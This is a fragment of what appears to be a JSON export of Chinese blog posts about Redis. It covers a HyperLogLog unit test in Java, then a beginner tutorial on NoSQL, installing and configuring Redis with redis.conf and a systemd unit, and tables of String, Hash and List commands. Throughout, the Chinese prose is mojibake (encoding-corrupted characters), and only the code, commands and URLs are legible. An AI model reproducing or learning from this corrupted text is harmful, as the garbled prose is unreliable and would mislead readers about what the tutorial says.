æ˜¯ä»LogLogç®—æ³•æ´¾ç”Ÿçš„æ¦‚ç‡ç®—æ³•ï¼Œç”¨äºç¡®å®šéå¸¸å¤§çš„é›†åˆçš„åŸºæ•°ï¼Œè€Œä¸éœ€è¦å­˜å‚¨å…¶æ‰€æœ‰å€¼ã€‚\n\nç›¸å…³ç®—æ³•åŸç†å¤§å®¶å¯ä»¥å‚è€ƒï¼šhttps://juejin.cn/post/6844903785744056333#heading-0\n\nRedisä¸­çš„HLLæ˜¯åŸºäºstringç»“æ„å®ç°çš„ï¼Œå•ä¸ªHLLçš„å†…å­˜**æ°¸è¿œå°äº16kb**ï¼Œ**å†…å­˜å ç”¨ä½**çš„ä»¤äººå‘æŒ‡ï¼ä½œä¸ºä»£ä»·ï¼Œå…¶æµ‹\n\né‡ç»“æœæ˜¯æ¦‚ç‡æ€§çš„ï¼Œ**æœ‰å°äº0.81ï¼…çš„è¯¯å·®**ã€‚ä¸è¿‡å¯¹äºUVç»Ÿè®¡æ¥è¯´ï¼Œè¿™å®Œå…¨å¯ä»¥å¿½ç•¥ã€‚\n\næµ‹è¯•æ€è·¯ï¼šæˆ‘ä»¬ç›´æ¥åˆ©ç”¨å•å…ƒæµ‹è¯•ï¼Œå‘HyperLogLogä¸­æ·»åŠ 100ä¸‡æ¡æ•°æ®ï¼Œçœ‹çœ‹å†…å­˜å ç”¨å’Œç»Ÿè®¡æ•ˆæœå¦‚ä½•\n\n```java\n@Test\nvoid testHyperLogLog() {\n  //æ’å…¥ä¸€ç™¾ä¸‡æ¡æ•°æ®ï¼Œ1000æ¡æ’å…¥ä¸€æ¬¡\n  // å‡†å¤‡æ•°ç»„ï¼Œè£…ç”¨æˆ·æ•°æ®\n  String[] users = new String[1000];\n  // æ•°ç»„è§’æ ‡\n  int index = 0;\n  for (int i = 1; i <= 1000000; i++) {\n    // èµ‹å€¼\n    users[index++] = \"user_\" + i;\n    // æ¯1000æ¡å‘é€ä¸€æ¬¡\n    if (i % 1000 == 0) {\n      index = 0;\n      //PFADD\n      stringRedisTemplate.opsForHyperLogLog().add(\"hll1\", users);\n    }\n  }\n  // ç»Ÿè®¡æ•°é‡ PFCOUNT\n  Long size = stringRedisTemplate.opsForHyperLogLog().size(\"hll1\");\n  System.out.println(\"size = \" + size);\n}\n```\n\nç»è¿‡æµ‹è¯•ï¼šæˆ‘ä»¬ä¼šå‘ç”Ÿä»–çš„è¯¯å·®æ˜¯åœ¨å…è®¸èŒƒå›´å†…ï¼Œå¹¶ä¸”å†…å­˜å ç”¨æå°\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["NoSQL"],"categories":["SQL"]},{"title":"Redis-åŸºç¡€ç¯‡","url":"/posts/27273.html","content":"\n\n\n# ä¸€ã€Redisç®€ä»‹\n\n## 1.è®¤è¯†NoSQL\n\n### 1.1\tä»€ä¹ˆæ˜¯NoSQL\n\n---\n\n- NoSQLæœ€å¸¸è§çš„è§£é‡Šæ˜¯\"`non-relational`\"ï¼Œæ³›æŒ‡**éå…³ç³»å‹çš„æ•°æ®åº“**ï¼Œå¾ˆå¤šäººä¹Ÿè¯´å®ƒæ˜¯\"***Not Only SQL***\"\n\n- NoSQL ä¸ä¾èµ–ä¸šåŠ¡é€»è¾‘æ–¹å¼å­˜å‚¨ï¼Œè€Œä»¥ç®€å•çš„key-valueæ¨¡å¼å­˜å‚¨ã€‚å› æ­¤å¤§å¤§çš„å¢åŠ äº†æ•°æ®åº“çš„æ‰©å±•èƒ½åŠ›ã€‚\n\n- åŒºåˆ«äºå…³ç³»æ•°æ®åº“ï¼Œå®ƒä»¬ä¸ä¿è¯å…³ç³»æ•°æ®çš„ACIDç‰¹æ€§\n- å¸¸è§çš„NoSQLæ•°æ®åº“æœ‰ï¼š`Redis`ã€`MemCache`ã€`MongoDB`ç­‰\n\n### 1.2 NoSQLé€‚ç”¨åœºæ™¯\n\n- å¯¹æ•°æ®é«˜å¹¶å‘çš„è¯»å†™\n\n- æµ·é‡æ•°æ®çš„è¯»å†™\n\n- å¯¹æ•°æ®é«˜å¯æ‰©å±•æ€§çš„\n\n### 1.3  NoSQLä¸é€‚ç”¨åœºæ™¯\n\n- éœ€è¦äº‹åŠ¡æ”¯æŒ\n\n- åŸºäºsqlçš„ç»“æ„åŒ–æŸ¥è¯¢å­˜å‚¨ï¼Œå¤„ç†å¤æ‚çš„å…³ç³»ï¼Œéœ€è¦å³å¸­æŸ¥è¯¢ã€‚\n\n### 1.4\tNoSQLä¸SQLçš„å·®å¼‚\n\n---\n\n|          |                            SQL                             |                            NoSQL                             |\n| :------: | :--------------------------------------------------------: | :----------------------------------------------------------: |\n| æ•°æ®ç»“æ„ |                           ç»“æ„åŒ–                           |                           éç»“æ„åŒ–                           |\n| æ•°æ®å…³è” |                           å…³è”çš„                           |                           æ— å…³è”çš„                           |\n| æŸ¥è¯¢æ–¹å¼ |                          SQLæŸ¥è¯¢                           |                            éSQL                             |\n| äº‹åŠ¡ç‰¹æ€§ |                            ACID                            |                             BASE                             |\n| å­˜å‚¨æ–¹å¼ |                            ç£ç›˜                            |                             å†…å­˜                             |\n|  æ‰©å±•æ€§  |                            å‚ç›´                            |                             æ°´å¹³                             |\n| ä½¿ç”¨åœºæ™¯ | 1ï¼‰æ•°æ®ç»“æ„å›ºå®š<br>2ï¼‰ç›¸å…³ä¸šåŠ¡å¯¹æ•°æ®å®‰å…¨æ€§ã€ä¸€è‡´æ€§è¦æ±‚è¾ƒé«˜ | 1ï¼‰æ•°æ®ç»“æ„ä¸å›ºå®š<br>2ï¼‰å¯¹ä¸€è‡´æ€§ã€å®‰å…¨æ€§è¦æ±‚ä¸é«˜<br>3ï¼‰å¯¹æ€§èƒ½è¦æ±‚ |\n\n## 2.è®¤è¯†Redis\n\n> Redisè¯ç”Ÿäº2009å¹´å…¨ç§°æ˜¯Remote Dictionary Serverï¼Œè¿œç¨‹è¯å…¸æœåŠ¡å™¨ï¼Œæ˜¯ä¸€ä¸ªåŸºäºå†…å­˜çš„é”®å€¼å‹NoSQLæ•°æ®åº“ã€‚\n\n**Redisçš„ç‰¹å¾ï¼š**\n\n- é”®å€¼ï¼ˆ`key-value`ï¼‰å‹ï¼Œvalueæ”¯æŒå¤šç§ä¸åŒæ•°æ®ç»“æ„ï¼ŒåŠŸèƒ½ä¸°å¯Œ\n- å•çº¿ç¨‹ï¼Œæ¯ä¸ªå‘½ä»¤å…·å¤‡åŸå­æ€§\n- ä½å»¶è¿Ÿï¼Œé€Ÿåº¦å¿«ï¼ˆåŸºäºå†…å­˜ã€IOå¤šè·¯å¤ç”¨ã€è‰¯å¥½çš„ç¼–ç ï¼‰\n- æ”¯æŒæ•°æ®æŒä¹…åŒ–\n- æ”¯æŒä¸»ä»é›†ç¾¤ã€åˆ†ç‰‡é›†ç¾¤\n- æ”¯æŒå¤šè¯­è¨€å®¢æˆ·ç«¯\n\n# äºŒã€Rediså®‰è£…\n\n## 1.Macå®‰è£…Redis\n\n### 1.1 å®‰è£…redis\n\n```bash\nbrew install redis\n```\n\n### 1.2 å¯åŠ¨Redis\n\n```bash\n# å¯åŠ¨\nbrew services start redis\n==> Successfully started `redis` (label: homebrew.mxcl.redis)\n# å…³é—­\nbrew services stop redis\n\n# è¿æ¥redis\nredis-cli\n\n# å…³é—­è¿æ¥ï¼Œå¹¶é€€å‡º\n127.0.0.1:6379> shutdown\nnot connected> quit\n```\n\n### 1.3 å…¶å®ƒæ“ä½œ\n\n**è¿œç¨‹è¿æ¥Redis**\n\n```bash\nredis-cli -h xxx.xx.xx.xx -p 6379 -a 123456\n```\n\n- `-h xxx.xx.xx.xx`ï¼šæŒ‡å®šè¦è¿æ¥çš„redisèŠ‚ç‚¹çš„IPåœ°å€ï¼Œé»˜è®¤æ˜¯127.0.0.1\n- `-p 6379`ï¼šæŒ‡å®šè¦è¿æ¥çš„redisèŠ‚ç‚¹çš„ç«¯å£ï¼Œé»˜è®¤æ˜¯6379\n- `-a 123456`ï¼šæŒ‡å®šredisçš„è®¿é—®å¯†ç  \n\n**æŒ‡å®šå¯†ç **\n\n```bash\n#æ–¹æ³•1\n#åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®requirepassçš„å¯†ç ï¼ˆå½“redisé‡å¯åå¯†ç ä¾ç„¶æœ‰æ•ˆï¼‰ã€‚\nrequirepass foobared ä¿®æ”¹æˆ : requirepass  123321\n\n#æ–¹æ³•2ï¼ˆå½“redisé‡å¯åå¯†ç æ— æ•ˆï¼‰ã€‚\n127.0.0.1:6379>config set requirepass 123321 #è®¾ç½®å¯†ç \nOk\n127.0.0.1:6379>config get requirepass #æŸ¥çœ‹å¯†ç \n\n\n127.0.0.1:6379> auth 123321 #æŒ‡å®šå¯†ç ï¼ˆç™»å½•æ—¶æœªæŒ‡å®šå¯†ç å¯ä»¥ç”¨æ­¤å‘½ä»¤åˆ¶å®šå¯†ç ï¼‰\nOk\n```\n\n**å¿ƒè·³æµ‹è¯•**\n\n```bash\n127.0.0.1:6379> ping \nPONG\n```\n\n## 2.Linuxå®‰è£…Redis\n\n---\n\n> æœ¬æ¬¡å®‰è£…Redisæ˜¯åŸºäºLinuxç³»ç»Ÿä¸‹å®‰è£…çš„ï¼Œå› æ­¤éœ€è¦ä¸€å°LinuxæœåŠ¡å™¨æˆ–è€…è™šæ‹Ÿæœºã€‚å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯è‡ªå·±è´­ä¹°çš„æœåŠ¡å™¨ï¼Œè¯·æå‰å¼€æ”¾`6379`ç«¯å£ï¼Œé¿å…åç»­å‡ºç°çš„è«åå…¶å¦™çš„é”™è¯¯ï¼\n>\n\n### 2.1 å®‰è£…ä¾èµ–\n\n---\n\n> Redisæ˜¯åŸºäºCè¯­è¨€ç¼–å†™çš„ï¼Œå› æ­¤é¦–å…ˆéœ€è¦å®‰è£…Redisæ‰€éœ€è¦çš„gccä¾èµ–\n\n```sh\nyum install -y gcc tcl\n```\n\n**å®‰è£…æˆåŠŸå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š**\n\n![](https://img.jwt1399.top/img/202207161119201.png)\n\n### 2.2 å®‰è£…Redis\n\n---\n\n**å°†`redis-6.2.6.tar`ä¸Šä¼ è‡³`/usr/local/src`ç›®å½•**\n\n![](https://img.jwt1399.top/img/202207161119399.png)\n\n**åœ¨xShellä¸­`cd`åˆ°`/usr/local/src`ç›®å½•æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œè§£å‹æ“ä½œ**\n\n```sh\ntar -xzf redis-6.2.6.tar.gz\n```\n\n**è§£å‹æˆåŠŸåä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤**\n\n```sh\ncd redis-6.2.6\nmake\nmake install\n```\n\n**å®‰è£…æˆåŠŸåæ‰“å¼€/usr/local/binç›®å½•ï¼ˆè¯¥ç›®å½•ä¸ºRedisé»˜è®¤çš„å®‰è£…ç›®å½•ï¼‰**\n\n![](https://img.jwt1399.top/img/202207161119072.png)\n\n### 2.3 å¯åŠ¨Redis\n\n> Redisçš„å¯åŠ¨æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œä¾‹å¦‚ï¼š**å‰å°å¯åŠ¨**ã€**åå°å¯åŠ¨**ã€**å¼€æœºè‡ªå¯**\n\n#### å‰å°å¯åŠ¨ï¼ˆä¸æ¨èï¼‰\n\n---\n\n> **è¿™ç§å¯åŠ¨å±äºå‰å°å¯åŠ¨ï¼Œä¼šé˜»å¡æ•´ä¸ªä¼šè¯çª—å£ï¼Œçª—å£å…³é—­æˆ–è€…æŒ‰ä¸‹`CTRL + C`åˆ™Redisåœæ­¢ã€‚ä¸æ¨èä½¿ç”¨ã€‚**\n\n**å®‰è£…å®Œæˆåï¼Œåœ¨ä»»æ„ç›®å½•è¾“å…¥`redis-server`å‘½ä»¤å³å¯å¯åŠ¨Redis**\n\n```sh\nredis-server\n```\n\n**å¯åŠ¨æˆåŠŸå¦‚ä¸‹å›¾æ‰€ç¤º**\n\n![](https://img.jwt1399.top/img/202207161121008.png)\n\n#### åå°å¯åŠ¨ï¼ˆä¸æ¨èï¼‰\n\n---\n\n> **å¦‚æœè¦è®©Redisä»¥åå°æ–¹å¼å¯åŠ¨ï¼Œåˆ™å¿…é¡»ä¿®æ”¹Redisé…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½•å°±æ˜¯ä¹‹å‰æˆ‘ä»¬è§£å‹çš„å®‰è£…åŒ…ä¸‹**\n\n**å› ä¸ºæˆ‘ä»¬è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆå°†åŸæ–‡ä»¶å¤‡ä»½ä¸€ä»½**\n\n```sh\ncd /usr/local/src/redis-6.2.6\n```\n\n```sh\ncp redis.conf redis.conf.bck\n```\n\n**ç„¶åä¿®æ”¹`redis.conf`æ–‡ä»¶ä¸­çš„ä¸€äº›é…ç½®**\n\n```sh\n# å…è®¸è®¿é—®çš„åœ°å€ï¼Œé»˜è®¤æ˜¯127.0.0.1ï¼Œä¼šå¯¼è‡´åªèƒ½åœ¨æœ¬åœ°è®¿é—®ã€‚ä¿®æ”¹ä¸º0.0.0.0åˆ™å¯ä»¥åœ¨ä»»æ„IPè®¿é—®ï¼Œç”Ÿäº§ç¯å¢ƒä¸è¦è®¾ç½®ä¸º0.0.0.0\nbind 0.0.0.0\n# å®ˆæŠ¤è¿›ç¨‹ï¼Œä¿®æ”¹ä¸ºyesåå³å¯åå°è¿è¡Œ\ndaemonize yes \n# å¯†ç ï¼Œè®¾ç½®åè®¿é—®Rediså¿…é¡»è¾“å…¥å¯†ç \nrequirepass 1325\n```\n\n**Rediså…¶ä»–å¸¸ç”¨é…ç½®**\n\n```sh\n# ç›‘å¬çš„ç«¯å£\nport 6379\n# å·¥ä½œç›®å½•ï¼Œé»˜è®¤æ˜¯å½“å‰ç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¿è¡Œredis-serveræ—¶çš„å‘½ä»¤ï¼Œæ—¥å¿—ã€æŒä¹…åŒ–ç­‰æ–‡ä»¶ä¼šä¿å­˜åœ¨è¿™ä¸ªç›®å½•\ndir .\n# æ•°æ®åº“æ•°é‡ï¼Œè®¾ç½®ä¸º1ï¼Œä»£è¡¨åªä½¿ç”¨1ä¸ªåº“ï¼Œé»˜è®¤æœ‰16ä¸ªåº“ï¼Œç¼–å·0~15\ndatabases 1\n# è®¾ç½®redisèƒ½å¤Ÿä½¿ç”¨çš„æœ€å¤§å†…å­˜\nmaxmemory 512mb\n# æ—¥å¿—æ–‡ä»¶ï¼Œé»˜è®¤ä¸ºç©ºï¼Œä¸è®°å½•æ—¥å¿—ï¼Œå¯ä»¥æŒ‡å®šæ—¥å¿—æ–‡ä»¶å\nlogfile \"redis.log\"\n```\n\n**å¯åŠ¨Redis**\n\n```sh\n# è¿›å…¥rediså®‰è£…ç›®å½• \ncd /usr/local/src/redis-6.2.6\n# å¯åŠ¨\nredis-server redis.conf\n```\n\n**åœæ­¢RedisæœåŠ¡**\n\n```sh\n# é€šè¿‡killå‘½ä»¤ç›´æ¥æ€æ­»è¿›ç¨‹\nkill -9 redisè¿›ç¨‹id\n```\n\n```sh\n# åˆ©ç”¨redis-cliæ¥æ‰§è¡Œ shutdown å‘½ä»¤ï¼Œå³å¯åœæ­¢ Redis æœåŠ¡ï¼Œ\n# å› ä¸ºä¹‹å‰é…ç½®äº†å¯†ç ï¼Œå› æ­¤éœ€è¦é€šè¿‡ -a æ¥æŒ‡å®šå¯†ç \nredis-cli -a 132537 shutdown\n```\n\n#### å¼€æœºè‡ªå¯ï¼ˆæ¨èï¼‰\n\n---\n\n> **æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®æ¥å®ç°å¼€æœºè‡ªå¯**\n\n**é¦–å…ˆï¼Œæ–°å»ºä¸€ä¸ªç³»ç»ŸæœåŠ¡æ–‡ä»¶**\n\n```sh\nvi /etc/systemd/system/redis.service\n```\n\n**å°†ä»¥ä¸‹å‘½ä»¤ç²˜è´´è¿›å»**\n\n```sh\n[Unit]\nDescription=redis-server\nAfter=network.target\n\n[Service]\nType=forking\nExecStart=/usr/local/bin/redis-server /usr/local/src/redis-6.2.6/redis.conf\nPrivateTmp=true\n\n[Install]\nWantedBy=multi-user.target\n```\n\n**ç„¶åé‡è½½ç³»ç»ŸæœåŠ¡**\n\n```sh\nsystemctl daemon-reload\n```\n\n**ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢è¿™ç»„å‘½ä»¤æ¥æ“ä½œredisäº†**\n\n```sh\n# å¯åŠ¨\nsystemctl start redis\n# åœæ­¢\nsystemctl stop redis\n# é‡å¯\nsystemctl restart redis\n# æŸ¥çœ‹çŠ¶æ€\nsystemctl status redis\n```\n\n**æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå¯ä»¥è®©rediså¼€æœºè‡ªå¯**\n\n```sh\nsystemctl enable redis\n```\n\n# ä¸‰ã€Rediså‘½ä»¤\n\né€šè¿‡Redisçš„ä¸­æ–‡æ–‡æ¡£å­¦ä¹ ï¼šhttp://www.redis.cn/commands.html\n\né€šè¿‡èœé¸Ÿæ•™ç¨‹å®˜ç½‘æ¥å­¦ä¹ ï¼šhttps://www.runoob.com/redis/redis-keys.html\n\n**Redisæ˜¯ä¸€ä¸ªkey-valueçš„æ•°æ®åº“ï¼Œkeyä¸€èˆ¬æ˜¯Stringç±»å‹ï¼Œä¸è¿‡valueçš„ç±»å‹å¤šç§å¤šæ ·**\n\n![](https://img.jwt1399.top/img/202207161135146.png)\n\n## 1.é€šç”¨å‘½ä»¤\n\n|   æŒ‡ä»¤   |                         æè¿°                          |\n| :------: | :---------------------------------------------------: |\n|   keys   |   æŸ¥çœ‹ç¬¦åˆæ¨¡æ¿çš„æ‰€æœ‰keyï¼Œä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒè®¾å¤‡ä¸Šä½¿ç”¨   |\n|   del    |                   åˆ é™¤ä¸€ä¸ªæŒ‡å®šçš„key                   |\n|  exists  |                    åˆ¤æ–­keyæ˜¯å¦å­˜åœ¨                    |\n|  expire  |  ç»™ä¸€ä¸ªkeyè®¾ç½®æœ‰æ•ˆæœŸï¼Œæœ‰æ•ˆæœŸåˆ°æœŸæ—¶è¯¥keyä¼šè¢«è‡ªåŠ¨åˆ é™¤   |\n|   ttl    | æŸ¥çœ‹ä¸€ä¸ªKEYçš„å‰©ä½™æœ‰æ•ˆæœŸï¼Œ-1è¡¨ç¤ºæ°¸ä¸è¿‡æœŸï¼Œ-2è¡¨ç¤ºå·²è¿‡æœŸ |\n|   type   |                 æŸ¥çœ‹ä½ çš„keyæ˜¯ä»€ä¹ˆç±»å‹                 |\n|  unlink  |                æ ¹æ®valueé€‰æ‹©éé˜»å¡åˆ é™¤                |\n|  select  |                      åˆ‡æ¢æ•°æ®åº“                       |\n|  dbsize  |               æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„keyçš„æ•°é‡               |\n| flushdb  |                      æ¸…ç©ºå½“å‰åº“                       |\n| flushall |                      é€šæ€å…¨éƒ¨åº“                       |\n\nå¯ä»¥é€šè¿‡`help [command] `å¯ä»¥æŸ¥çœ‹ä¸€ä¸ªå‘½ä»¤çš„å…·ä½“ç”¨æ³•ï¼\n\n## 2.åŸºæœ¬ç±»å‹\n\n### 2.1 å­—ç¬¦ä¸²-String\n\nStringç±»å‹æ˜¯Redisæœ€åŸºæœ¬çš„æ•°æ®ç±»å‹ï¼Œä¸€ä¸ªRedisä¸­å­—ç¬¦ä¸²valueæœ€å¤šå¯ä»¥æ˜¯512M\n\n> **Stringçš„å¸¸è§å‘½ä»¤**\n\n|     å‘½ä»¤      |                             æè¿°                             |\n| :-----------: | :----------------------------------------------------------: |\n|      set      |         æ·»åŠ æˆ–è€…ä¿®æ”¹å·²ç»å­˜åœ¨çš„ä¸€ä¸ªStringç±»å‹çš„é”®å€¼å¯¹         |\n|      get      |                 æ ¹æ®keyè·å–Stringç±»å‹çš„value                 |\n|     mset      |                æ‰¹é‡æ·»åŠ å¤šä¸ªStringç±»å‹çš„é”®å€¼å¯¹                |\n|     mget      |             æ ¹æ®å¤šä¸ªkeyè·å–å¤šä¸ªStringç±»å‹çš„value             |\n|    Strlen     |                       è·å¾—valueçš„é•¿åº¦                        |\n|   incr/decr   |                  è®©ä¸€ä¸ªæ•´å‹çš„keyè‡ªå¢/è‡ªå‡1                   |\n| incrby/decrby | è®©ä¸€ä¸ªæ•´å‹çš„keyè‡ªå¢/è‡ªå‡ï¼Œå¹¶æŒ‡å®šæ­¥é•¿ï¼Œä¾‹å¦‚ï¼šincrby num 2 è®©numå€¼è‡ªå¢2 |\n|  incrbyfloat  |              è®©ä¸€ä¸ªæµ®ç‚¹ç±»å‹çš„æ•°å­—è‡ªå¢å¹¶æŒ‡å®šæ­¥é•¿              |\n|     setnx     |   æ·»åŠ ä¸€ä¸ªStringç±»å‹çš„é”®å€¼å¯¹ï¼Œå‰ææ˜¯è¿™ä¸ªkeyä¸å­˜åœ¨ï¼Œæ‰æ‰§è¡Œ    |\n|     setex     |          æ·»åŠ ä¸€ä¸ªStringç±»å‹çš„é”®å€¼å¯¹ï¼Œå¹¶ä¸”æŒ‡å®šæœ‰æ•ˆæœŸ          |\n|   getrange    |           è·å¾—valueçš„èŒƒå›´ï¼Œä¾‹å¦‚ï¼šgetrange name 0 4           |\n|   setrange    |   ä»æŒ‡å®šä½ç½®è¦†ç›–keyå­˜å‚¨çš„valueï¼Œä¾‹å¦‚ï¼šsetrange name 0 jian   |\n|    getset     | ä»¥æ–°æ¢æ—§ï¼Œè®¾ç½®äº†æ–°å€¼åŒæ—¶è·å¾—æ—§å€¼ã€‚ä¾‹å¦‚ï¼šgetset name xiaojian |\n\næ•°æ®ç»“æ„ï¼šStringçš„æ•°æ®ç»“æ„ä¸ºç®€å•åŠ¨æ€å­—ç¬¦ä¸²(Simple Dynamic String,ç¼©å†™SDS)ã€‚æ˜¯å¯ä»¥ä¿®æ”¹çš„å­—ç¬¦ä¸²ï¼Œå†…éƒ¨ç»“æ„å®ç°ä¸Šç±»ä¼¼äºJavaçš„ArrayListï¼Œé‡‡ç”¨é¢„åˆ†é…å†—ä½™ç©ºé—´çš„æ–¹å¼æ¥å‡å°‘å†…å­˜çš„é¢‘ç¹åˆ†é….\n\n### 2.2 å“ˆå¸Œ-Hash\n\nhashæ˜¯ä¸€ä¸ªstringç±»å‹çš„fieldå’Œvalueçš„æ˜ å°„è¡¨ï¼Œhashç‰¹åˆ«é€‚åˆç”¨äºå­˜å‚¨å¯¹è±¡ã€‚ç±»ä¼¼Javaé‡Œé¢çš„HashMap\n\næ¯ä¸ª hash å¯ä»¥å­˜å‚¨ 2<sup>32</sup> - 1 é”®å€¼å¯¹ï¼ˆ40å¤šäº¿ï¼‰ã€‚\n\n![](https://img.jwt1399.top/img/202207161523224.png)\n\n> Hashçš„å¸¸è§å‘½ä»¤\n\n|         å‘½ä»¤         |                             æè¿°                             |\n| :------------------: | :----------------------------------------------------------: |\n| hset key field value |              æ·»åŠ æˆ–è€…ä¿®æ”¹hashç±»å‹keyçš„fieldçš„å€¼              |\n|    hget key field    |                è·å–ä¸€ä¸ªhashç±»å‹keyçš„fieldçš„å€¼                |\n|        hmset         |       hmset å’Œ hset æ•ˆæœç›¸åŒ ï¼Œ4.0ä¹‹åhmsetå¯ä»¥å¼ƒç”¨äº†        |\n|        hmget         |              æ‰¹é‡è·å–å¤šä¸ªhashç±»å‹keyçš„fieldçš„å€¼              |\n|       hgetall        |         è·å–ä¸€ä¸ªhashç±»å‹çš„keyä¸­çš„æ‰€æœ‰çš„fieldå’Œvalue          |\n|        hkeys         |             è·å–ä¸€ä¸ªhashç±»å‹çš„keyä¸­çš„æ‰€æœ‰çš„field             |\n|        hvals         |             è·å–ä¸€ä¸ªhashç±»å‹çš„keyä¸­çš„æ‰€æœ‰çš„value             |\n|       hincrby        |           è®©ä¸€ä¸ªhashç±»å‹keyçš„å­—æ®µå€¼è‡ªå¢å¹¶æŒ‡å®šæ­¥é•¿            |\n|        hsetnx        | æ·»åŠ ä¸€ä¸ªhashç±»å‹çš„keyçš„fieldå€¼ï¼Œå‰ææ˜¯è¿™ä¸ªfieldä¸å­˜åœ¨ï¼Œå¦åˆ™ä¸æ‰§è¡Œ |\n\n```bash\n127.0.0.1:6379> hset userkey name \"jack\" age 18 birth \"2004-07\"\n(integer) 3\n127.0.0.1:6379> hgetall userkey\n1) \"name\"\n2) \"jack\"\n3) \"age\"\n4) \"18\"\n5) \"birth\"\n6) \"2004-07\"\n```\n\n> æ•°æ®ç»“æ„\n\nHashç±»å‹å¯¹åº”çš„æ•°æ®ç»“æ„æ˜¯ä¸¤ç§ï¼šziplistï¼ˆå‹ç¼©åˆ—è¡¨ï¼‰ï¼Œhashtableï¼ˆå“ˆå¸Œè¡¨ï¼‰ã€‚å½“field-valueé•¿åº¦è¾ƒçŸ­ä¸”ä¸ªæ•°è¾ƒå°‘æ—¶ï¼Œä½¿ç”¨ziplistï¼Œå¦åˆ™ä½¿ç”¨hashtableã€‚\n\n### 2.3 åˆ—è¡¨-List\n\nRedisä¸­çš„Listç±»å‹ä¸Javaä¸­çš„LinkedListç±»ä¼¼ï¼Œå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ç»“æ„ã€‚æ—¢å¯ä»¥æ”¯æŒæ­£å‘æ£€ç´¢å’Œä¹Ÿå¯ä»¥æ”¯æŒåå‘æ£€ç´¢ã€‚\n\nä¸€ä¸ªåˆ—è¡¨æœ€å¤šå¯ä»¥åŒ…å« 2<sup>32</sup> - 1 ä¸ªå…ƒç´  (4294967295, æ¯ä¸ªåˆ—è¡¨è¶…è¿‡40äº¿ä¸ªå…ƒç´ )ã€‚\n\n**ç‰¹å¾ä¹Ÿä¸`LinkedList`ç±»ä¼¼ï¼š**\n\n- æœ‰åº\n- å…ƒç´ å¯ä»¥é‡å¤\n- æ’å…¥å’Œåˆ é™¤å¿«\n- æŸ¥è¯¢é€Ÿåº¦ä¸€èˆ¬\n\nå¸¸ç”¨æ¥å­˜å‚¨ä¸€ä¸ªæœ‰åºæ•°æ®ï¼Œä¾‹å¦‚ï¼šæœ‹å‹åœˆç‚¹èµåˆ—è¡¨ï¼Œè¯„è®ºåˆ—è¡¨ç­‰ã€‚\n\n![](https://img.jwt1399.top/img/202207161524345.png)\n\n> Listçš„å¸¸è§å‘½ä»¤\n\n|            å‘½ä»¤             |                             æè¿°                             |\n| :-------------------------: | :----------------------------------------------------------: |\n|   lpush key  element ...    |                 å‘åˆ—è¡¨å·¦ä¾§æ’å…¥ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´                  |\n|          lpop key           |                ç§»é™¤å¹¶è¿”å›åˆ—è¡¨å·¦ä¾§çš„ç¬¬ä¸€ä¸ªå…ƒç´                 |\n|   rpush key  element ...    |                 å‘åˆ—è¡¨å³ä¾§æ’å…¥ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´                  |\n|          rpop key           |                ç§»é™¤å¹¶è¿”å›åˆ—è¡¨å³ä¾§çš„ç¬¬ä¸€ä¸ªå…ƒç´                 |\n|     lrange key star end     |                 è¿”å›ä¸€æ®µè§’æ ‡èŒƒå›´å†…çš„æ‰€æœ‰å…ƒç´                  |\n|        blpopå’Œbrpop         | ä¸LPOPå’ŒRPOPç±»ä¼¼ï¼Œåªä¸è¿‡åœ¨æ²¡æœ‰å…ƒç´ æ—¶ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿”å›nil |\n|  rpoplpush \\<key1>\\<key2>   |      ä»\\<key1>åˆ—è¡¨å³è¾¹åå‡ºä¸€ä¸ªå€¼ï¼Œæ’åˆ°\\<key2>åˆ—è¡¨å·¦è¾¹ã€‚      |\n|   lindex  \\<key>\\<index>    |                æŒ‰ç…§ç´¢å¼•ä¸‹æ ‡è·å¾—å…ƒç´ (ä»å·¦åˆ°å³)                |\n|         llen \\<key>         |                         è·å¾—åˆ—è¡¨é•¿åº¦                         |\n|   lrem \\<key>\\<n>\\<value>   |                      ä»å·¦è¾¹åˆ é™¤nä¸ªvalue                      |\n| lset \\<key>\\<index>\\<value> |             å°†åˆ—è¡¨keyä¸‹æ ‡ä¸ºindexçš„å€¼æ›¿æ¢æˆvalue              |\n\n![](https://img.jwt1399.top/img/202207161553022.gif)\n\n> 